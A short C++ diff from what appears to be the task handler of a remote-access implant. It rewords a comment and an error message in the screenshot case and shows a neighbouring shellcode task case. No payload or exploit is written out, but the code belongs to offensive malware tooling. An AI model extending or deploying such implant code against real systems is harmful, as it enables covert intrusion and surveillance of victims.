@@ -308,11 +308,11 @@ namespace Handler
                 );
                 break;
             case TASK_SCREENSHOT:
-                 // Is DLL implant, the screenshot feature is not available.
+                //  If the implant is DLL, the screenshot feature is not available.
                 #ifndef IS_DLL
                 wTaskResult = Task::Screenshot(pState);
                 #else
-                wTaskResult = L"Cannot take a screenshot on DLL";
+                wTaskResult = L"Error: Cannot take a screenshot on DLL";
                 #endif
                 break;
             case TASK_SHELLCODE:
